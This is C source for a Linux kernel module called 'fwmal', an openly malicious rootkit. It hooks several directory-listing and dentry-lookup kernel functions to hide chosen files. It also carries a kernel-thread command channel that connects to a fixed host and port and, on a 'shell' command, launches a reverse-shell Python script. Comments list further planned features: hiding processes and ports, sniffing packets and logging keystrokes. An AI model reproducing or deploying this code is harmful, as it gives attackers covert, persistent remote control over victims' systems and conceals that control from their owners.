#include <linux/kernel.h>
#include <linux/module.h>
#include<linux/in.h>
#include <linux/init.h>
#include <linux/moduleparam.h>
#include<linux/inet.h>
#include<linux/socket.h>
#include<net/sock.h>
#include<linux/init.h>
#include<linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/list.h>
#include <linux/sched.h>   //wake_up_process()
#include <linux/kthread.h> //kthread_create()、kthread_run()
#include <linux/err.h>           //IS_ERR()、PTR_ERR()2.实现（kthread_create 与kthread_run区别）
#include "khook/engine.c"

#define MAGIC_ID 11111
#define PORT 8889
#define ADRESS "127.0.0.1"
#define BUFFER_SIZE 1024
#define SLEEP_TIME 10*1000
#define HIDEFILE "fwmal"
//static struct nf_hook_ops my_nf_hook;
struct task_struct *background_task;
struct socket *socket;
struct sockaddr_in s_addr;

LIST_HEAD(files);
struct fwmal_filename{
	char* name;
	struct list_head list;
};

int addfile(const char* name){
	struct fwmal_filename *file = kmalloc(sizeof(struct fwmal_filename), GFP_KERNEL);
	file->name = kmalloc(strlen(name)+1, GFP_KERNEL);
	memcpy(file->name, name, strlen(name));
	file->name[strlen(name)] = '\0';
	list_add_tail(&file->list, &files);
	printk("[fwmal]:ssss%s\n",file->name);
	return 0;
}

int deletefile(struct fwmal_filename* file){
	list_del(&file->list);
	kfree(file->name);
	kfree(file);
	return 0;
}

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen,
			    loff_t offset, u64 ino, unsigned int d_type)
{
	struct list_head* ld;
	int ret = 0;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){printk("[fwmal]:ddd%s\n",name); return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
}


KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){\
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){printk("[fwmal]:ddd%s\n",name); return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, container_of(ld,struct fwmal_filename,list)->name)){printk("[fwmal]:ddd%s\n",name); return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name); return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void *__buf, const char *name, int namlen,
				loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name); return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name); return ret;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
{
	struct dentry *found = NULL;
	struct list_head* ld;
	list_for_each(ld,&files){
		//printk("[fwmal]:ddd%s\n",container_of(ld,struct fwmal_filename,list)->name);
		if (strstr(name->name, (const char *)(container_of(ld,struct fwmal_filename,list)->name))){printk("[fwmal]:ddd%s\n",name->name); return found;}
		//printk("[fwmal]:%s\n",container_of(ld,struct fwmal_filename,list)->name);
	}
	found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}


/*
#include <linux/fs.h> // has inode_permission() proto
KHOOK(inode_permission);
static int khook_inode_permission(struct inode *inode, int mask)
{
	int ret = 0;
	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
	printk("[fwmal]:%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
	return ret;
}

#include <linux/binfmts.h> // has no load_elf_binary() proto
KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
static int khook_load_elf_binary(struct linux_binprm *bprm)
{
	int ret = 0;
	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
	printk("[fwmal]:%s(%p) = %d\n", __func__, bprm, ret);
	return ret;
}
*/

/*
netfilter 钩子函数
*/
/*
unsigned int packet_hook(const struct nf_hook_ops *ops,
				struct sk_buff *socket_buffer,
				const struct net_device *in,
				const struct net_device *out, 
				int (*okfn)(struct sk_buff *))
{
	//printk("[fwmal]:acctpt packet\n");
	struct iphdr iph;
	//读出ip头
	const struct iphdr *ip_header = skb_header_pointer(socket_buffer, 0, sizeof(iph), &iph);
	if (!ip_header)
		return NF_ACCEPT;
	if (!ip_header->protocol)
		return NF_ACCEPT;

	if (ip_header->protocol == IPPROTO_TCP) {
		struct tcphdr tcph;
		//读出tcp头，ihl为ip包首部长度，单位为4字节
		const struct tcphdr *tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(tcph), &tcph);
		if (!tcp_header)
			return NF_ACCEPT;
		int size = htons(ip_header->tot_len) - sizeof(iph) - sizeof(tcph);
		char *data = kmalloc(size, GFP_KERNEL);
		char *string = kmalloc(size + 1, GFP_KERNEL);
		const char *tcp_data = skb_header_pointer(socket_buffer,ip_header->ihl * 4 + sizeof(struct tcphdr),size, &_data);
		
	}

	return NF_ACCEPT;
}

void init_nf(void)
{
	my_nf_hook.hook = (void *)packet_hook;
	my_nf_hook.pf = PF_INET;
	my_nf_hook.priority = NF_IP_PRI_FIRST;
	my_nf_hook.hooknum = NF_INET_PRE_ROUTING;
	nf_register_hook(&my_nf_hook);
}
*/

/*
字符串功能描述
0、exit：退出，在fwmal_thread中处理
1、shell：生成shell
2、hidefile：隐藏文件
3、hidethread：隐藏进程
4、hideports：隐藏端口
5、getnetpacket：获取网络包
6、getkeyboard：获取键盘输入
7、getmouse：得到鼠标位置
*/
int parse(char* buf){
	/*
	char* path = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
	char* start = "/usr/bin/python";
	char* arg = "/home/likaiming/workspace/fwmal/script/reverse_shell.py";
	char *envp[] = {path, NULL};
	char *argv[] = {start, arg, NULL};
	*/

	char cmd_path[] = "/usr/bin/python";  
	char *cmd_argv[] = {cmd_path, "/home/likaiming/workspace/fwmal/script/reverse_shell.py", NULL};  
	char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};  
	
	/*
	char cmd_path[] = "/usr/bin/touch";  
	char *cmd_argv[] = {cmd_path, "/home/likaiming/workspace/fwmal/test.txt", NULL};  
	char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
	*/
	printk("[fwmal]:parse\n");
	if(strcmp(buf,"shell") == 0){
		return call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_EXEC); //call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
	}else if(strcmp(buf,"hidefile")==0){
		printk("[fwmal]:hidefile");
	}
	
	return 0;
}

int fwmal_thread(void* data)
{
	int ser;
	struct msghdr send_msg, recv_msg;
	struct kvec send_vec, recv_vec;
	char *send_buf = NULL;
	char *recv_buf = NULL;
	int ret;
	printk("[fwmal]:enter fwmal thread\n");
	while(1){
		printk("[fwmal]:begin connect\n");
		ser = socket->ops->connect(socket,(struct sockaddr *)&s_addr, sizeof(s_addr),0);
		if(ser!=0){
			printk("[fwmal]:connect fail\n");
			msleep(SLEEP_TIME);
			continue;
		}
		//进入交互逻辑
		printk("[fwmal]:connect ok\n");
		recv_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
		send_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
		memset(send_buf, 'a', BUFFER_SIZE);
		memset(&send_msg, 0, sizeof(send_msg));
		memset(&send_vec, 0, sizeof(send_vec));
		send_vec.iov_base = send_buf;
		send_vec.iov_len = BUFFER_SIZE;

		memset(recv_buf, 0, BUFFER_SIZE);
		memset(&recv_vec, 0, sizeof(recv_vec));
		memset(&recv_msg, 0, sizeof(recv_msg));
		recv_vec.iov_base = recv_buf;
		recv_vec.iov_len = BUFFER_SIZE;

		while(1){
			printk("[fwmal]:recv begin\n");
			ret = kernel_recvmsg(socket, &recv_msg, &recv_vec, 1, 1024, 0);
			if(ret<0) break;
			printk("[fwmal]:%s\n",recv_buf);
			if(strcmp(recv_buf,"exit") == 0) break;
			else
				ret = parse(recv_buf);
			ret = kernel_sendmsg(socket, &send_msg, &send_vec, 1, BUFFER_SIZE);
			if(ret<0) break;
		}
		msleep(SLEEP_TIME);
	}
	return 0;
}


void init_thread(void)
{
	//初始化socket相关内容
	memset(&s_addr,0,sizeof(s_addr));
	s_addr.sin_family=AF_INET;
	s_addr.sin_port=htons(PORT);
	s_addr.sin_addr.s_addr=in_aton(ADRESS);
	socket = (struct socket *)kmalloc(sizeof(struct socket),GFP_KERNEL);
	sock_create_kern(&init_net,AF_INET, SOCK_STREAM,0,&socket);

	//初始化内核线程
	background_task = kthread_create(fwmal_thread,NULL,"fwmal_thread");//&init_net,void (*fwmal_thread)(void)
	wake_up_process(background_task);
}


static int __init fwmal_init(void)
{
	int ret = khook_init();
	//init_thread();
	//init_nf();
	//ret = parse("hidefile");
	addfile("fwmaltest");

	if (ret != 0)
		goto out;
	//printk("[fwmal]:%d\n",ret);
	printk("[fwmal]:Hello World\n");
out:
	return ret;
}

static void __exit fwmal_exit(void)
{
	printk(KERN_ALERT "[fwmal]:Goodbye World\n");
	khook_cleanup();
}

module_init(fwmal_init);
module_exit(fwmal_exit);
MODULE_LICENSE("GPL");
